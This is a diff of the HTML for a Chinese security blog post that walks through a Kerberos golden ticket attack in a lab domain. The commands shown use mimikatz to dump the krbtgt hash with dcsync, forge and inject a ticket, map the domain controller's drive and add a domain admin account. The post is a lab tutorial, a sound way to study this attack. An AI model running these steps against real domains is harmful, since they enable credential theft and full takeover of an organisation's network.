@@ -20,23 +20,29 @@
     var CONFIG = {"hostname":"swanq.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="前言域内常用的两种攻击包括黄金票据Golden ticket和白银票据SILVER TICKET，本篇博客先来介绍一下金票 域环境   ROLE IP OS    DC域控 10.xx.xx.xx 2012   漏洞原理：票据生成步骤： 域名 1ipconfig &#x2F;all 域的SID值      1lsadump::dcsyns &#x2F;domain:wlaq.com &#x2F;user:krbtgt    S">
+  <meta name="description" content="前言域内常用的两种攻击包括黄金票据Golden ticket和白银票据SILVER TICKET，本篇博客先来介绍一下金票 域环境   ROLE IP OS    DC域控 10.xx.xx.xx 2012   票据生成步骤： 域名 1ipconfig &#x2F;all 域的SID值      1lsadump::dcsyns &#x2F;domain:wlaq.com &#x2F;user:krbtgt    SID：50">
 <meta property="og:type" content="article">
 <meta property="og:title" content="域渗透提权维权之金票">
 <meta property="og:url" content="http://swanq.top/2021/07/05/%E9%87%91%E7%A5%A8/index.html">
 <meta property="og:site_name" content="SwanQ&#39;s Blue SKY">
-<meta property="og:description" content="前言域内常用的两种攻击包括黄金票据Golden ticket和白银票据SILVER TICKET，本篇博客先来介绍一下金票 域环境   ROLE IP OS    DC域控 10.xx.xx.xx 2012   漏洞原理：票据生成步骤： 域名 1ipconfig &#x2F;all 域的SID值      1lsadump::dcsyns &#x2F;domain:wlaq.com &#x2F;user:krbtgt    S">
+<meta property="og:description" content="前言域内常用的两种攻击包括黄金票据Golden ticket和白银票据SILVER TICKET，本篇博客先来介绍一下金票 域环境   ROLE IP OS    DC域控 10.xx.xx.xx 2012   票据生成步骤： 域名 1ipconfig &#x2F;all 域的SID值      1lsadump::dcsyns &#x2F;domain:wlaq.com &#x2F;user:krbtgt    SID：50">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://swanq.top/2021/07/05/%E9%87%91%E7%A5%A8/2.png">
 <meta property="og:image" content="http://swanq.top/2021/07/05/%E9%87%91%E7%A5%A8/1.jpg">
 <meta property="og:image" content="http://swanq.top/2021/07/05/%E9%87%91%E7%A5%A8/3.png">
+<meta property="og:image" content="http://swanq.top/2021/07/05/%E9%87%91%E7%A5%A8/12.png">
 <meta property="og:image" content="http://swanq.top/2021/07/05/%E9%87%91%E7%A5%A8/4.png">
 <meta property="og:image" content="http://swanq.top/2021/07/05/%E9%87%91%E7%A5%A8/8.png">
+<meta property="og:image" content="http://swanq.top/2021/07/05/%E9%87%91%E7%A5%A8/13.png">
+<meta property="og:image" content="http://swanq.top/2021/07/05/%E9%87%91%E7%A5%A8/14.png">
+<meta property="og:image" content="http://swanq.top/2021/07/05/%E9%87%91%E7%A5%A8/15.png">
 <meta property="og:image" content="http://swanq.top/2021/07/05/%E9%87%91%E7%A5%A8/9.png">
+<meta property="og:image" content="http://swanq.top/2021/07/05/%E9%87%91%E7%A5%A8/16.png">
+<meta property="og:image" content="http://swanq.top/2021/07/05/%E9%87%91%E7%A5%A8/17.png">
 <meta property="og:image" content="http://swanq.top/2021/07/05/%E9%87%91%E7%A5%A8/10.png">
 <meta property="og:image" content="http://swanq.top/2021/07/05/%E9%87%91%E7%A5%A8/11.png">
 <meta property="article:published_time" content="2021-07-05T06:28:21.000Z">
-<meta property="article:modified_time" content="2021-07-07T02:50:12.683Z">
+<meta property="article:modified_time" content="2021-07-07T08:01:29.067Z">
 <meta property="article:author" content="swanQ">
 <meta property="article:tag" content="网络安全">
 <meta property="article:tag" content="渗透测试">
@@ -204,7 +210,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-07-07 10:50:12" itemprop="dateModified" datetime="2021-07-07T10:50:12+08:00">2021-07-07</time>
+                <time title="修改时间：2021-07-07 16:01:29" itemprop="dateModified" datetime="2021-07-07T16:01:29+08:00">2021-07-07</time>
               </span>
 
           
@@ -212,7 +218,7 @@
               <span class="post-meta-item-icon">
                 <i class="far fa-file-word"></i>
               </span>
-              <span>1.9k</span>
+              <span>2k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -245,7 +251,7 @@
 <td align="center">2012</td>
 </tr>
 </tbody></table>
-<h1 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h1><h1 id="票据生成步骤："><a href="#票据生成步骤：" class="headerlink" title="票据生成步骤："></a>票据生成步骤：</h1><ol>
+<h1 id="票据生成步骤："><a href="#票据生成步骤：" class="headerlink" title="票据生成步骤："></a>票据生成步骤：</h1><ol>
 <li><p><strong>域名</strong></p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure></li>
 <li><p><strong>域的SID值</strong>     </p>
@@ -259,9 +265,10 @@
 <li><p><strong>域的KRBTGT账户NTLM-HASH</strong></p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsyns /domain:wlaq.com /user:krbtgt</span><br></pre></td></tr></table></figure></li>
 <li><p><strong>伪造任意域管账号</strong></p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user test swanq000!<span class="selector-tag">@</span><span class="comment"># /add /domain</span></span><br></pre></td></tr></table></figure></li>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user test password /add /domain</span><br></pre></td></tr></table></figure></li>
 </ol>
 <h1 id="0x01-获取域SID及krbtgt的HTLM-hash"><a href="#0x01-获取域SID及krbtgt的HTLM-hash" class="headerlink" title="0x01.获取域SID及krbtgt的HTLM-hash"></a>0x01.获取域SID及krbtgt的HTLM-hash</h1><p>先在DC上新建一个实验用户swanq,此攻击都是基于在域控机子上的普通域内账户.即普通域内账户没有创建域管账户的权限或提升普通用户权限，而利用黄金票据可以做到</p>
+<p>获取SID</p>
 <p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/1.jpg"></p>
 <p>mimikatz获取域控SID及krbtgt的NTLMhash.可在域控或在登陆过域控账户的域成员上获取</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:wlaq.com /user:krbtgt</span><br></pre></td></tr></table></figure>
@@ -278,20 +285,35 @@
 </li>
 </ul>
 </blockquote>
-<h1 id="0x02-伪造票据"><a href="#0x02-伪造票据" class="headerlink" title="0x02.伪造票据"></a>0x02.伪造票据</h1><p>在非域控的机子上，需要先清除本地票据缓存，但因此swanq用户刚创建且并未有其他服务需要票据，所以此处为空，不需要kerberos::purge   </p>
+<h1 id="0x02-伪造票据"><a href="#0x02-伪造票据" class="headerlink" title="0x02.伪造票据"></a>0x02.伪造票据</h1><p>在非域控的机子上，需要先清除本地票据缓存，但因此swanq用户刚创建且并未有其他服务需要票据，所以此处为空，不需要</p>
+<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/12.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge   </span><br></pre></td></tr></table></figure>
+
 <p>得到krbtgt hash后，用mimikatz的Kerberos::golden功能生成金票ticket.kiribi伪造TGT</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:test /domain:wlaq.com /sid:&#123;s<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-xxx</span>&#125;  /krbtgt:&#123;ntlm<span class="literal">-hash</span>&#125; /ticket:ticket.kiribi</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:swanq /domain:wlaq.com /sid:&#123;s<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-xxx</span>&#125;  /krbtgt:&#123;ntlm<span class="literal">-hash</span>&#125; /ticket:ticket.kiribi</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/4.png"></p>
 <h1 id="0x03-票据利用"><a href="#0x03-票据利用" class="headerlink" title="0x03.票据利用"></a>0x03.票据利用</h1><p>查看本地保存的票据,确认无误</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/8.png"></p>
+<p>或者klist也可</p>
+<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/13.png"></p>
 <p>将伪造的黄金票据导入内存</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kerberos::ptt ticket.kiribi</span><br></pre></td></tr></table></figure>
 
-<p>新建域管账户</p>
+<p>此时可以直接将DC的C盘映射到本地h盘，进行访问，访问有两种方式：</p>
+<p>其一</p>
+<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/14.png"></p>
+<p>其二</p>
+<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/15.png"></p>
 <p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/9.png"></p>
+<p>入DC检查</p>
+<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/16.png"></p>
+<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/17.png"></p>
+<p>除了映射之外也可直接添加域管账户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use username password &#x2F;add &#x2F;domain</span><br></pre></td></tr></table></figure>
+
 <p>入DC检查</p>
 <p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/10.png"></p>
 <p>不过此域管账户并没有本地登录权限，还是需要加入administrator组</p>
@@ -424,7 +446,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E7%8E%AF%E5%A2%83"><span class="nav-number">2.</span> <span class="nav-text">域环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="nav-number">3.</span> <span class="nav-text">漏洞原理：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%A5%A8%E6%8D%AE%E7%94%9F%E6%88%90%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="nav-number">4.</span> <span class="nav-text">票据生成步骤：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E8%8E%B7%E5%8F%96%E5%9F%9FSID%E5%8F%8Akrbtgt%E7%9A%84HTLM-hash"><span class="nav-number">5.</span> <span class="nav-text">0x01.获取域SID及krbtgt的HTLM-hash</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-%E4%BC%AA%E9%80%A0%E7%A5%A8%E6%8D%AE"><span class="nav-number">6.</span> <span class="nav-text">0x02.伪造票据</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8"><span class="nav-number">7.</span> <span class="nav-text">0x03.票据利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-%E6%A3%80%E6%B5%8B%E5%8F%8A%E6%B8%85%E7%90%86"><span class="nav-number">8.</span> <span class="nav-text">0x04.检测及清理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="nav-number">9.</span> <span class="nav-text">总结：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A"><span class="nav-number">10.</span> <span class="nav-text">参考：</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E7%8E%AF%E5%A2%83"><span class="nav-number">2.</span> <span class="nav-text">域环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%A5%A8%E6%8D%AE%E7%94%9F%E6%88%90%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="nav-number">3.</span> <span class="nav-text">票据生成步骤：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E8%8E%B7%E5%8F%96%E5%9F%9FSID%E5%8F%8Akrbtgt%E7%9A%84HTLM-hash"><span class="nav-number">4.</span> <span class="nav-text">0x01.获取域SID及krbtgt的HTLM-hash</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-%E4%BC%AA%E9%80%A0%E7%A5%A8%E6%8D%AE"><span class="nav-number">5.</span> <span class="nav-text">0x02.伪造票据</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8"><span class="nav-number">6.</span> <span class="nav-text">0x03.票据利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-%E6%A3%80%E6%B5%8B%E5%8F%8A%E6%B8%85%E7%90%86"><span class="nav-number">7.</span> <span class="nav-text">0x04.检测及清理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="nav-number">8.</span> <span class="nav-text">总结：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A"><span class="nav-number">9.</span> <span class="nav-text">参考：</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
